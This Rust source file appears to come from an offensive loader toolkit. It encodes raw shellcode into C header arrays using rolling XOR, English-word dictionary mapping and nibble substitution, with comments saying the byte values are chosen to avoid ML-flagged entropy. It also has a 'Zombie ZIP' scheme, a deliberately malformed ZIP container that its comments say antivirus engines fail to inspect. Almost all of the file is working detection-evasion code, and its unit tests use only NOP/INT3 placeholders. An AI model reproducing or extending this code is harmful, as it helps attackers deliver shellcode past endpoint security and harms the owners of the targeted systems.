//! Payload Encoder
//!
//! Encodes raw shellcode/payloads into C header format compatible with decoder modules.
//! Supports multiple encoding schemes:
//!   - None: Raw bytes, no encoding (direct copy)
//!   - XOR: Rolling 2-byte XOR key
//!   - English: Dictionary-based word mapping (low entropy)

use anyhow::{Result, bail};
use flate2::Compression;
use flate2::write::DeflateEncoder;
use std::collections::HashMap;
use std::io::Write;

/// Encoding type for payload
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum EncodingType {
    /// Rolling 2-byte XOR encoding
    #[default]
    Xor,
    /// Dictionary-based English word encoding
    English,
    /// No encoding — raw payload bytes
    None,
    /// Sub-byte nibble mapping (4-bit split, 16-entry lookup table)
    SubByte,
    /// Zombie ZIP — malformed ZIP container (method=STORED, data=raw DEFLATE)
    ZombieZip,
}

impl std::str::FromStr for EncodingType {
    type Err = anyhow::Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "xor" => Ok(Self::Xor),
            "english" => Ok(Self::English),
            "none" => Ok(Self::None),
            "subbyte" | "sub_byte" | "nibble" => Ok(Self::SubByte),
            "zombiezip" | "zombie_zip" | "zombie-zip" | "zzip" => Ok(Self::ZombieZip),
            other => bail!(
                "Unknown encoding type: '{}'. Valid: xor, english, none, subbyte, zombiezip",
                other
            ),
        }
    }
}

impl EncodingType {
    /// Get the decoder module name for this encoding
    pub fn decoder_module(&self) -> &'static str {
        match self {
            Self::Xor => "xor",
            Self::English => "english",
            Self::None => "none",
            Self::SubByte => "subbyte",
            Self::ZombieZip => "zombie_zip",
        }
    }
}

/// Default sub-byte nibble mapping — empirically validated "safe" byte values
/// that avoid ML-flagged entropy patterns.
const DEFAULT_SUBBYTE_MAPPING: [u8; 16] = [0, 2, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 20];

/// Payload encoder that generates C header code
pub struct PayloadEncoder {
    /// XOR key (for XOR encoding)
    xor_key: [u8; 2],
    /// Dictionary words (for English encoding)
    dictionary: Vec<String>,
    /// Sub-byte nibble mapping (16 entries, one per 4-bit nibble value)
    subbyte_mapping: [u8; 16],
}

impl PayloadEncoder {
    /// Create a new encoder with random XOR key
    pub fn new() -> Self {
        // Use a simple deterministic seed for reproducibility
        // In production, you'd want actual randomness
        Self {
            xor_key: [0xAA, 0x55],
            dictionary: Self::generate_dictionary(),
            subbyte_mapping: DEFAULT_SUBBYTE_MAPPING,
        }
    }

    /// Create encoder with specific XOR key
    pub fn with_xor_key(key: [u8; 2]) -> Self {
        Self {
            xor_key: key,
            dictionary: Self::generate_dictionary(),
            subbyte_mapping: DEFAULT_SUBBYTE_MAPPING,
        }
    }

    /// Create encoder with specific sub-byte nibble mapping
    pub fn with_subbyte_mapping(mapping: [u8; 16]) -> Self {
        Self {
            xor_key: [0xAA, 0x55],
            dictionary: Self::generate_dictionary(),
            subbyte_mapping: mapping,
        }
    }

    /// Generate the 256-word dictionary for English encoding
    pub fn generate_dictionary() -> Vec<String> {
        let common_words = [
            "the", "be", "to", "of", "and", "a", "in", "that", "have", "i", "it", "for", "not",
            "on", "with", "he", "as", "you", "do", "at", "this", "but", "his", "by", "from",
            "they", "we", "say", "her", "she", "or", "an", "will", "my", "one", "all", "would",
            "there", "their", "what", "so", "up", "out", "if", "about", "who", "get", "which",
            "go", "me", "when", "make", "can", "like", "time", "no", "just", "him", "know", "take",
        ];

        let mut dictionary: Vec<String> = common_words.iter().map(|s| s.to_string()).collect();

        // Fill remaining slots with generated words
        while dictionary.len() < 256 {
            dictionary.push(format!("w{}", dictionary.len()));
        }

        dictionary
    }

    /// Encode payload using the specified encoding type.
    ///
    /// # Examples
    ///
    /// ```rust,ignore
    /// let encoder = PayloadEncoder::with_xor_key([0xAA, 0x55]);
    /// let encoded = encoder.encode(&[0x90, 0xCC], EncodingType::Xor);
    /// assert_eq!(encoded.data.len(), 2);
    /// ```
    pub fn encode(&self, payload: &[u8], encoding: EncodingType) -> EncodedPayload {
        match encoding {
            EncodingType::Xor => self.encode_xor(payload),
            EncodingType::English => self.encode_english(payload),
            EncodingType::None => Self::encode_none(payload),
            EncodingType::SubByte => self.encode_subbyte(payload),
            EncodingType::ZombieZip => Self::encode_zombiezip(payload),
        }
    }

    /// XOR encode the payload
    fn encode_xor(&self, payload: &[u8]) -> EncodedPayload {
        let encoded: Vec<u8> = payload
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ self.xor_key[i % 2])
            .collect();

        EncodedPayload {
            encoding: EncodingType::Xor,
            data: encoded,
            metadata: {
                let mut m = HashMap::new();
                m.insert(
                    "xor_key_0".to_string(),
                    format!("0x{:02X}", self.xor_key[0]),
                );
                m.insert(
                    "xor_key_1".to_string(),
                    format!("0x{:02X}", self.xor_key[1]),
                );
                m
            },
        }
    }

    /// English word encode the payload
    fn encode_english(&self, payload: &[u8]) -> EncodedPayload {
        let words: Vec<String> = payload
            .iter()
            .map(|&b| self.dictionary[b as usize].clone())
            .collect();

        EncodedPayload {
            encoding: EncodingType::English,
            data: words.join(" ").into_bytes(),
            metadata: HashMap::new(),
        }
    }

    /// No-op encode — raw bytes unchanged
    fn encode_none(payload: &[u8]) -> EncodedPayload {
        EncodedPayload {
            encoding: EncodingType::None,
            data: payload.to_vec(),
            metadata: HashMap::new(),
        }
    }

    /// Sub-byte nibble mapping encode
    /// Each byte is split into two 4-bit nibbles, each mapped through a 16-entry lookup table.
    /// Result: 2x payload size but fully controlled byte distribution/entropy.
    fn encode_subbyte(&self, payload: &[u8]) -> EncodedPayload {
        let mut encoded = Vec::with_capacity(payload.len() * 2);
        for &byte in payload {
            let high = (byte >> 4) & 0x0F;
            let low = byte & 0x0F;
            encoded.push(self.subbyte_mapping[high as usize]);
            encoded.push(self.subbyte_mapping[low as usize]);
        }

        EncodedPayload {
            encoding: EncodingType::SubByte,
            data: encoded,
            metadata: {
                let mut m = HashMap::new();
                for (i, &v) in self.subbyte_mapping.iter().enumerate() {
                    m.insert(format!("subbyte_map_{}", i), format!("{}", v));
                }
                m.insert("original_len".to_string(), payload.len().to_string());
                m
            },
        }
    }

    /// Generate C header code for the encoded payload.
    ///
    /// Produces a complete `payload.h` header with `#ifndef` guards,
    /// `PAYLOAD_LEN` define, encoding-specific constants (XOR keys, dictionary,
    /// sub-byte mapping), and the `supermega_payload` byte array.
    pub fn generate_c_header(&self, encoded: &EncodedPayload) -> String {
        match encoded.encoding {
            EncodingType::Xor => self.generate_xor_header(encoded),
            EncodingType::English => self.generate_english_header(encoded),
            EncodingType::None => Self::generate_none_header(encoded),
            EncodingType::SubByte => self.generate_subbyte_header(encoded),
            EncodingType::ZombieZip => Self::generate_zombiezip_header(encoded),
        }
    }

    /// Generate C header for XOR-encoded payload
    fn generate_xor_header(&self, encoded: &EncodedPayload) -> String {
        let key_0 = encoded.metadata.get("xor_key_0").unwrap();
        let key_1 = encoded.metadata.get("xor_key_1").unwrap();
        let array = format_c_byte_array(&encoded.data);

        format!(
            r#"/* Auto-generated payload header - XOR encoding */
#ifndef PAYLOAD_H
#define PAYLOAD_H

#define PAYLOAD_LEN {len}

unsigned char XOR_KEY[2] = {{ {key_0}, {key_1} }};

unsigned char supermega_payload[PAYLOAD_LEN] = {{
{array}
}};

#endif /* PAYLOAD_H */
"#,
            len = encoded.data.len(),
            key_0 = key_0,
            key_1 = key_1,
            array = array
        )
    }

    /// Generate C header for raw (no encoding) payload
    fn generate_none_header(encoded: &EncodedPayload) -> String {
        let array = format_c_byte_array(&encoded.data);

        format!(
            r#"/* Auto-generated payload header - no encoding */
#ifndef PAYLOAD_H
#define PAYLOAD_H

#define PAYLOAD_LEN {len}

unsigned char supermega_payload[PAYLOAD_LEN] = {{
{array}
}};

#endif /* PAYLOAD_H */
"#,
            len = encoded.data.len(),
            array = array
        )
    }

    /// Generate C header for English-encoded payload
    fn generate_english_header(&self, encoded: &EncodedPayload) -> String {
        let word_string = String::from_utf8_lossy(&encoded.data);
        let word_count = word_string.split_whitespace().count();

        // Generate dictionary array
        let dict_entries: Vec<String> = self
            .dictionary
            .iter()
            .map(|w| format!("\"{}\"", w))
            .collect();
        let dict_array = dict_entries.join(", ");

        format!(
            r#"/* Auto-generated payload header - English encoding */
#ifndef PAYLOAD_H
#define PAYLOAD_H
#define ENGLISH_ENCODING

#define PAYLOAD_LEN {len}

const char* DICTIONARY[] = {{ {dict} }};

char supermega_payload_str[] = "{words}";

/* Dummy array for compatibility (decoder will use supermega_payload_str) */
unsigned char supermega_payload[1] = {{ 0 }};

#endif /* PAYLOAD_H */
"#,
            len = word_count,
            dict = dict_array,
            words = word_string
        )
    }

    /// Zombie ZIP encode — wraps payload in a malformed ZIP container.
    ///
    /// The ZIP local file header declares `method=0` (STORED) but the data is
    /// raw DEFLATE compressed. AV engines that trust the method field see random
    /// "stored" bytes and detect nothing. The CRC-32 is set to the uncompressed
    /// payload's checksum so compliant parsers that check CRC will flag it, but
    /// most AV ZIP parsers don't cross-check method vs. data.
    ///
    /// **Carrier compatibility:** Requires carriers that allocate a separate
    /// destination buffer (`alloc_rw_rx`, `peb_walk`). In-place carriers like
    /// `change_rw_rx` will corrupt data because source and destination overlap.
    fn encode_zombiezip(payload: &[u8]) -> EncodedPayload {
        let crc = crc32fast::hash(payload);
        let uncompressed_size = payload.len() as u32;

        // Raw DEFLATE compress (no zlib/gzip header)
        let mut encoder = DeflateEncoder::new(Vec::new(), Compression::best());
        encoder.write_all(payload).expect("DEFLATE write failed");
        let compressed = encoder.finish().expect("DEFLATE finish failed");
        let compressed_size = compressed.len() as u32;

        let filename = b"data.bin";
        let filename_len = filename.len() as u16;

        let mut zip = Vec::new();

        // --- Local file header (30 bytes + filename) ---
        zip.extend_from_slice(&0x04034b50u32.to_le_bytes()); // Local file header signature
        zip.extend_from_slice(&20u16.to_le_bytes()); // Version needed to extract
        zip.extend_from_slice(&0u16.to_le_bytes()); // General purpose bit flag
        zip.extend_from_slice(&0u16.to_le_bytes()); // Compression method: 0 = STORED (the lie)
        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file time
        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file date
        zip.extend_from_slice(&crc.to_le_bytes()); // CRC-32 (of uncompressed data)
        zip.extend_from_slice(&compressed_size.to_le_bytes()); // Compressed size
        zip.extend_from_slice(&uncompressed_size.to_le_bytes()); // Uncompressed size
        zip.extend_from_slice(&filename_len.to_le_bytes()); // File name length
        zip.extend_from_slice(&0u16.to_le_bytes()); // Extra field length

        zip.extend_from_slice(filename);

        let data_offset = zip.len(); // 30 + filename_len = 38

        // --- File data (raw DEFLATE bytes) ---
        zip.extend_from_slice(&compressed);

        // --- Central directory header (46 bytes + filename) ---
        let cd_offset = zip.len() as u32;
        zip.extend_from_slice(&0x02014b50u32.to_le_bytes()); // Central directory signature
        zip.extend_from_slice(&20u16.to_le_bytes()); // Version made by
        zip.extend_from_slice(&20u16.to_le_bytes()); // Version needed to extract
        zip.extend_from_slice(&0u16.to_le_bytes()); // General purpose bit flag
        zip.extend_from_slice(&0u16.to_le_bytes()); // Compression method: 0 = STORED
        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file time
        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file date
        zip.extend_from_slice(&crc.to_le_bytes()); // CRC-32
        zip.extend_from_slice(&compressed_size.to_le_bytes()); // Compressed size
        zip.extend_from_slice(&uncompressed_size.to_le_bytes()); // Uncompressed size
        zip.extend_from_slice(&filename_len.to_le_bytes()); // File name length
        zip.extend_from_slice(&0u16.to_le_bytes()); // Extra field length
        zip.extend_from_slice(&0u16.to_le_bytes()); // File comment length
        zip.extend_from_slice(&0u16.to_le_bytes()); // Disk number start
        zip.extend_from_slice(&0u16.to_le_bytes()); // Internal file attributes
        zip.extend_from_slice(&0u32.to_le_bytes()); // External file attributes
        zip.extend_from_slice(&0u32.to_le_bytes()); // Relative offset of local header

        zip.extend_from_slice(filename);

        // --- End of central directory record (22 bytes) ---
        let cd_size = (zip.len() as u32) - cd_offset;
        zip.extend_from_slice(&0x06054b50u32.to_le_bytes()); // EOCD signature
        zip.extend_from_slice(&0u16.to_le_bytes()); // Number of this disk
        zip.extend_from_slice(&0u16.to_le_bytes()); // Disk where CD starts
        zip.extend_from_slice(&1u16.to_le_bytes()); // Number of CD records on this disk
        zip.extend_from_slice(&1u16.to_le_bytes()); // Total number of CD records
        zip.extend_from_slice(&cd_size.to_le_bytes()); // Size of central directory
        zip.extend_from_slice(&cd_offset.to_le_bytes()); // Offset of start of CD
        zip.extend_from_slice(&0u16.to_le_bytes()); // Comment length

        let mut metadata = HashMap::new();
        metadata.insert("original_len".to_string(), payload.len().to_string());
        metadata.insert("compressed_len".to_string(), compressed.len().to_string());
        metadata.insert("data_offset".to_string(), data_offset.to_string());
        metadata.insert("crc32".to_string(), format!("0x{:08X}", crc));

        EncodedPayload {
            encoding: EncodingType::ZombieZip,
            data: zip,
            metadata,
        }
    }

    /// Generate C header for Zombie ZIP encoded payload
    fn generate_zombiezip_header(encoded: &EncodedPayload) -> String {
        let original_len: usize = encoded.metadata["original_len"].parse().unwrap();
        let compressed_len: usize = encoded.metadata["compressed_len"].parse().unwrap();
        let data_offset: usize = encoded.metadata["data_offset"].parse().unwrap();
        let array = format_c_byte_array(&encoded.data);

        format!(
            r#"/* Auto-generated payload header - Zombie ZIP encoding */
#ifndef PAYLOAD_H
#define PAYLOAD_H
#define ZOMBIEZIP_ENCODING

#define PAYLOAD_LEN {original_len}
#define ZOMBIEZIP_CONTAINER_LEN {container_len}
#define ZOMBIEZIP_DATA_OFFSET {data_offset}
#define ZOMBIEZIP_COMPRESSED_LEN {compressed_len}

unsigned char supermega_payload[ZOMBIEZIP_CONTAINER_LEN] = {{
{array}
}};

#endif /* PAYLOAD_H */
"#,
            original_len = original_len,
            container_len = encoded.data.len(),
            data_offset = data_offset,
            compressed_len = compressed_len,
            array = array,
        )
    }

    /// Generate C header for sub-byte nibble-mapped payload
    fn generate_subbyte_header(&self, encoded: &EncodedPayload) -> String {
        let original_len: usize = encoded.metadata["original_len"].parse().unwrap();
        let mapping_entries: Vec<String> = self
            .subbyte_mapping
            .iter()
            .map(|b| format!("0x{:02X}", b))
            .collect();
        let array = format_c_byte_array(&encoded.data);

        format!(
            r#"/* Auto-generated payload header - SubByte encoding */
#ifndef PAYLOAD_H
#define PAYLOAD_H
#define SUBBYTE_ENCODING

#define PAYLOAD_LEN {original_len}
#define ENCODED_PAYLOAD_LEN {encoded_len}

unsigned char SUBBYTE_MAPPING[16] = {{ {mapping} }};

unsigned char supermega_payload[ENCODED_PAYLOAD_LEN] = {{
{array}
}};

#endif /* PAYLOAD_H */
"#,
            original_len = original_len,
            encoded_len = encoded.data.len(),
            mapping = mapping_entries.join(", "),
            array = array,
        )
    }
}

impl Default for PayloadEncoder {
    fn default() -> Self {
        Self::new()
    }
}

/// Encoded payload data
#[derive(Debug, Clone)]
pub struct EncodedPayload {
    /// Encoding type used
    pub encoding: EncodingType,
    /// Encoded data (bytes for XOR, space-separated words for English)
    pub data: Vec<u8>,
    /// Additional metadata (e.g., XOR keys)
    pub metadata: HashMap<String, String>,
}

/// Format bytes as a C array
fn format_c_byte_array(data: &[u8]) -> String {
    let mut lines = Vec::new();
    let chunk_size = 12;

    for chunk in data.chunks(chunk_size) {
        let hex_values: Vec<String> = chunk.iter().map(|b| format!("0x{:02X}", b)).collect();
        lines.push(format!("    {},", hex_values.join(", ")));
    }

    lines.join("\n")
}

/// Generate a dummy/test payload (NOPs + INT3).
///
/// Fills the buffer with `0x90` (NOP) and places two `0xCC` (INT3)
/// bytes at the end. Useful for integration tests that need a valid
/// payload without real shellcode.
pub fn generate_test_payload(size: usize) -> Vec<u8> {
    let mut payload = vec![0x90; size]; // NOPs
    if size >= 2 {
        payload[size - 2] = 0xCC; // INT3
        payload[size - 1] = 0xCC; // INT3
    }
    payload
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::read::DeflateDecoder;
    use std::io::Read as _;
    use std::str::FromStr;

    #[test]
    fn test_xor_encoding_roundtrip() {
        let encoder = PayloadEncoder::with_xor_key([0xAA, 0x55]);
        let original = vec![0x41, 0x42, 0x43, 0x44]; // "ABCD"

        let encoded = encoder.encode(&original, EncodingType::Xor);

        // Decode manually to verify
        let decoded: Vec<u8> = encoded
            .data
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ [0xAA, 0x55][i % 2])
            .collect();

        assert_eq!(original, decoded);
    }

    #[test]
    fn test_english_encoding() {
        let encoder = PayloadEncoder::new();
        let payload = vec![0, 1, 2]; // "the be to"

        let encoded = encoder.encode(&payload, EncodingType::English);
        let word_string = String::from_utf8_lossy(&encoded.data);

        assert!(word_string.contains("the"));
        assert!(word_string.contains("be"));
        assert!(word_string.contains("to"));
    }

    #[test]
    fn test_c_header_generation() {
        let encoder = PayloadEncoder::with_xor_key([0xAA, 0x55]);
        let payload = vec![0x90, 0x90, 0xCC];

        let encoded = encoder.encode(&payload, EncodingType::Xor);
        let header = encoder.generate_c_header(&encoded);

        assert!(header.contains("#define PAYLOAD_LEN 3"));
        assert!(header.contains("XOR_KEY[2]"));
        assert!(header.contains("supermega_payload"));
    }

    #[test]
    fn test_none_encoding_roundtrip() {
        let encoder = PayloadEncoder::new();
        let original = vec![0x41, 0x42, 0x43, 0x44];

        let encoded = encoder.encode(&original, EncodingType::None);

        // None encoding: data is unchanged
        assert_eq!(original, encoded.data);
        assert_eq!(encoded.encoding, EncodingType::None);
    }

    #[test]
    fn test_none_c_header_generation() {
        let encoder = PayloadEncoder::new();
        let payload = vec![0x90, 0x90, 0xCC];

        let encoded = encoder.encode(&payload, EncodingType::None);
        let header = encoder.generate_c_header(&encoded);

        assert!(header.contains("#define PAYLOAD_LEN 3"));
        assert!(header.contains("supermega_payload"));
        assert!(!header.contains("XOR_KEY"));
        assert!(!header.contains("ENGLISH_ENCODING"));
        assert!(header.contains("no encoding"));
    }

    #[test]
    fn test_encoding_type_parsing() {
        assert_eq!(EncodingType::from_str("xor").unwrap(), EncodingType::Xor);
        assert_eq!(EncodingType::from_str("XOR").unwrap(), EncodingType::Xor);
        assert_eq!(
            EncodingType::from_str("english").unwrap(),
            EncodingType::English
        );
        assert_eq!(EncodingType::from_str("none").unwrap(), EncodingType::None);
        assert_eq!(EncodingType::from_str("None").unwrap(), EncodingType::None);
        assert_eq!(
            EncodingType::from_str("subbyte").unwrap(),
            EncodingType::SubByte
        );
        assert!(EncodingType::from_str("unknown").is_err());
    }

    #[test]
    fn test_generate_test_payload() {
        let payload = generate_test_payload(10);
        assert_eq!(payload.len(), 10);
        assert_eq!(payload[0], 0x90); // NOP
        assert_eq!(payload[8], 0xCC); // INT3
        assert_eq!(payload[9], 0xCC); // INT3
    }

    #[test]
    fn test_zombiezip_encoding_type_parsing() {
        for name in &[
            "zombiezip",
            "zombie_zip",
            "zombie-zip",
            "zzip",
            "ZombieZip",
            "ZOMBIEZIP",
        ] {
            assert_eq!(
                EncodingType::from_str(name).unwrap(),
                EncodingType::ZombieZip,
                "Failed to parse '{}'",
                name
            );
        }
    }

    #[test]
    fn test_zombiezip_produces_valid_zip_structure() {
        let encoder = PayloadEncoder::new();
        let payload = vec![0x90; 64];
        let encoded = encoder.encode(&payload, EncodingType::ZombieZip);

        // ZIP local file header signature: PK\x03\x04
        assert_eq!(&encoded.data[0..4], &[0x50, 0x4B, 0x03, 0x04]);

        // Required metadata keys present
        assert!(encoded.metadata.contains_key("original_len"));
        assert!(encoded.metadata.contains_key("compressed_len"));
        assert!(encoded.metadata.contains_key("data_offset"));
        assert!(encoded.metadata.contains_key("crc32"));

        assert_eq!(encoded.metadata["original_len"], "64");
    }

    #[test]
    fn test_zombiezip_method_field_is_stored() {
        let encoder = PayloadEncoder::new();
        let payload = vec![0xDE, 0xAD, 0xBE, 0xEF];
        let encoded = encoder.encode(&payload, EncodingType::ZombieZip);

        // Compression method is at offset 8-9 in the local file header
        // Method = 0 (STORED) — the core "lie" of the Zombie ZIP technique
        assert_eq!(encoded.data[8], 0x00);
        assert_eq!(encoded.data[9], 0x00);
    }

    #[test]
    fn test_zombiezip_roundtrip() {
        let encoder = PayloadEncoder::new();
        let original = vec![0x41, 0x42, 0x43, 0x44, 0x90, 0x90, 0xCC, 0xCC];
        let encoded = encoder.encode(&original, EncodingType::ZombieZip);

        let data_offset: usize = encoded.metadata["data_offset"].parse().unwrap();
        let compressed_len: usize = encoded.metadata["compressed_len"].parse().unwrap();

        // Extract the raw DEFLATE data from the ZIP container
        let compressed_data = &encoded.data[data_offset..data_offset + compressed_len];

        // Decompress using flate2
        let mut decoder = DeflateDecoder::new(compressed_data);
        let mut decompressed = Vec::new();
        decoder.read_to_end(&mut decompressed).unwrap();

        assert_eq!(original, decompressed);
    }

    #[test]
    fn test_zombiezip_c_header_generation() {
        let encoder = PayloadEncoder::new();
        let payload = vec![0x90; 32];
        let encoded = encoder.encode(&payload, EncodingType::ZombieZip);
        let header = encoder.generate_c_header(&encoded);

        assert!(header.contains("#define ZOMBIEZIP_ENCODING"));
        assert!(header.contains("#define PAYLOAD_LEN 32"));
        assert!(header.contains("#define ZOMBIEZIP_CONTAINER_LEN"));
        assert!(header.contains("#define ZOMBIEZIP_DATA_OFFSET"));
        assert!(header.contains("#define ZOMBIEZIP_COMPRESSED_LEN"));
        assert!(header.contains("supermega_payload[ZOMBIEZIP_CONTAINER_LEN]"));
        assert!(header.contains("Zombie ZIP encoding"));
    }

    #[test]
    fn test_zombiezip_deterministic() {
        let encoder = PayloadEncoder::new();
        let payload = vec![0x90; 128];

        let a = encoder.encode(&payload, EncodingType::ZombieZip);
        let b = encoder.encode(&payload, EncodingType::ZombieZip);

        assert_eq!(a.data, b.data);
        assert_eq!(a.metadata, b.metadata);
    }
}
